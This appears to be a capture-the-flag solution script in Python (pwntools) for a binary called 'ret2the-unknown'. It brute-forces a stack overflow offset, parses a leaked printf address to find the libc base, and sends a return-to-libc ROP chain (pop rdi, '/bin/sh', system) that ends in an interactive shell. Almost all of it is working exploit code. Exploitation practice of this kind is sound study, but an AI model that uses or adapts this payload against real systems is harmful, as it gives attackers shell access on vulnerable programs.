from pwn import *
 
FILENAME = 'ret2the-unknown'

def extract_printf(output):
    print(output)
    output = output.replace(b"phew, good to know. shoot! i forgot!\nrob said i'd need this to get there: ", b"")
    addr = output.split(b"\ngood luck!")[0]
    #print(addr)
    return eval("0x"+addr.decode())
    
## Bruteforce length ######################
length = []
for i in range(1,1000):
    payload = cyclic(i)
    io = process(FILENAME)
    io.recv()
    io.sendline(payload)
   # io.sendline('')
    res = io.recv()
    print(res)
    if b'safely' in res:
        io.close()
        length.append(i)# = i
        print(extract_printf(res))
        #break
    io.wait()
    exit_code = io.poll()
    print(exit_code)
    if exit_code == -11:
        length.append(i)# = i
        break
    
print(length)
length = length[-1]

e = ELF(FILENAME)
print(e.symbols)

libc = ELF("libc-2.28.so")
#print(l.symbols)
#while 1: pass


### Leak printf address ################################################
io = process(FILENAME)
io.recv()
io.sendline(b"A"*40)
printf_addr = extract_printf(io.recv())
print(p64(printf_addr))

## Exploit
offset = libc.symbols['system'] - libc.symbols['printf']
#binsh = next(libc.search(b"/bin/sh"))
pop_rdi = 0x00000000004012a3
#system_addr = e.symbols['main']#
libc_base = printf_addr - libc.symbols['printf']
sh_addr = libc_base + 0x181519
system_addr = printf_addr + offset

print(hex(system_addr))

payload = b""
payload += p64(pop_rdi)
payload += p64(sh_addr)
payload += p64(system_addr)

io.send(b"A"*40+payload+b"\n")
io.interactive()
